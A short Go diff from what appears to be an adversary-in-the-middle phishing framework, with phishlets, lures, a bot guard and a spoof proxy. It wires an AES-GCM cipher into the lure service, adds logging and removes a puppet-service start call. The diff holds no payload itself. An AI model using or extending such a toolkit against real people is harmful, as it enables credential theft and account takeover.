@@ -14,6 +14,7 @@ import (
 	"github.com/travisbale/mirage/internal/botguard"
 	"github.com/travisbale/mirage/internal/cert"
 	"github.com/travisbale/mirage/internal/config"
+	aesgcm "github.com/travisbale/mirage/internal/crypto/aes"
 	"github.com/travisbale/mirage/internal/dns"
 	"github.com/travisbale/mirage/internal/events"
 	"github.com/travisbale/mirage/internal/obfuscator"
@@ -225,18 +226,17 @@ func (ini *initializer) initServices() error {
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
 	ini.spoofProxy = proxy.NewSpoofProxy(ini.cfg.SpoofURL, ini.logger)
 
-	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore)
+	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore, ini.logger)
 	ini.loadPhishlets(ini.cfg.PhishletsDir, phishletSvc)
 	if err := phishletSvc.LoadFromDB(); err != nil {
 		return fmt.Errorf("loading phishlets from db: %w", err)
 	}
 	ini.phishletSvc = phishletSvc
 
-	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc}
+	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc, Cipher: aesgcm.Cipher{}}
 	ini.wsHub = proxy.NewWSHub(ini.bus, ini.sessionSvc, ini.lureSvc, ini.logger)
 
 	ini.puppetSvc = ini.initPuppet()
-	ini.puppetSvc.Start()
 	ini.Daemon.puppetSvc = ini.puppetSvc
 
 	return nil
